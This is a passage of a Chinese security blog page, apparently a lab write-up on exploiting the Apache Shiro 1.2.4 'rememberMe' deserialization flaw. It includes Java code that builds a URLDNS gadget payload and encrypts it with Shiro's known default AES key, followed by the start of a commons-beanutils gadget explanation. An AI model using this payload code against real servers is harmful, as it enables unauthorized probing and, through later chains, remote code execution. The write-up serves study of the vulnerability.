@@ -1,0 +1,2266 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>Shiro550 URLDNS&amp;CC&amp;CB攻击 | Godown_blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    
+        <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    
+
+    
+        <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Godown_blog" type="application/atom+xml">
+</head>
+
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Godown_blog</h3>
+      <h5 class="drawer-box-head_desc">山水为竭，冬雷震震</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(5)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(5)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(5)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/godownio">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Godown_blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/godownio" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B896.png')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        Shiro550 URLDNS&amp;CC&amp;CB攻击
+      </span>
+    </div>
+    
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span><span class="number">.4</span> <span class="comment">//切换到1.2.4版本</span></span><br></pre></td></tr></table></figure>
+
+<p>修改samples&#x2F;web&#x2F;pom.xml jstl依赖为1.2，否则jsp解析报错</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175529287.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175529287.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>修改插件来源</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175502977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175502977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>配置Tomcat见：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44769520/article/details/123476443">https://blog.csdn.net/qq_44769520/article/details/123476443</a></p>
+<p>建议下8版本8.5.56 zip</p>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a></p>
+<p>解压后IDEA编辑配置，选择Tomcat本地，运行即可。运行后访问主页如下：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805113952439.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805113952439.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>需要调试Tomcat的，把Tomcat下的lib库导入项目库</p>
+<p>Shiro 550的原理我就不再重复多分析了</p>
+<p>简单说来就是：序列化字节码-&gt;固定密钥AES加密-&gt;base64编码-&gt;POST数据-&gt;反序列化</p>
+<p>感兴趣的去org.apache.shiro.web.mgt.CookieRememberMeManager分析。</p>
+<p>给一个栈图，在OncePerRequestFilter的doFilter处理请求，在CookieRememberMeManager生成cookie和处理cookie。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805154744315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805154744315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>着重看下利用</p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS不需要依赖，直接盲打以探测漏洞。</p>
+<p>另外起一个项目模拟攻击环境，下一个shiro1.2.4的库，pom里自行添加dependency</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805161830522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805161830522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>URLDNS生成字节码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yourdnslog&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对字节码编码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroEncode550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意一个域名只能用一次，比如你的域名为ivtfbe.dnslog.cn，可以第一个包发1.ivtfbe.dnslog.cn，第二个发2.ivtfbe.dnslog.cn</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805171035575.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805171035575.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>盲打成功：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805162346628.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805162346628.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="Commons-collections"><a href="#Commons-collections" class="headerlink" title="Commons-collections"></a>Commons-collections</h2><p>尽管我们在依赖库看到了commons-collections:3.2.1的依赖</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803190638939.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803190638939.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>在maven依赖重复按ctrl+”+”全部展开，搜索找到commons-collections的依赖。但是标注了为test</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805174000684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805174000684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<blockquote>
+<p>依赖包有依赖范围，在pom.xml <code>&lt;dependencies&gt;</code>标签下有<code>&lt;scope&gt;</code>依赖范围声明。没有的默认值为compile</p>
+<p>compile: 表示依赖库将被包含在编译、测试和运行时环境中。<br>test: 表示依赖库仅在测试阶段使用，不会被打包到最终的应用程序中。<br>provided: 类似于test，但在某些情况下（如Web应用服务器提供的类库），该依赖在运行时环境中是可选的。<br>runtime: 表示依赖库在运行时需要，但不需要在编译时存在。<br>system: 类似于provided，但是需要显式地提供一个系统路径指向依赖库。</p>
+</blockquote>
+<p>那我们就算找到了反序列化入口，怎么利用呢？</p>
+<p>ysoserial给出的是commons-beanutils。且为compile依赖</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803191001874.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803191001874.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>问题出在该库下的PropertyUtils.getProperty()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806170911541.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806170911541.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>PropertyUtils.getProperty用于获取属性值。比如一个符合javabean规范的Person下有age属性。如下代码能获取age值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">PropertyUtils.getProperty(person,<span class="string">&quot;age&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>那是怎么获取到的呢？</p>
+<blockquote>
+<p>下面是一些 JavaBean 规范的基本要求：</p>
+<ol>
+<li><p>公共类：<br> JavaBean 必须是一个公共类，即类声明前必须有 public 关键字。</p>
+</li>
+<li><p>无参构造器：<br> JavaBean 必须有一个无参的公共构造器。</p>
+</li>
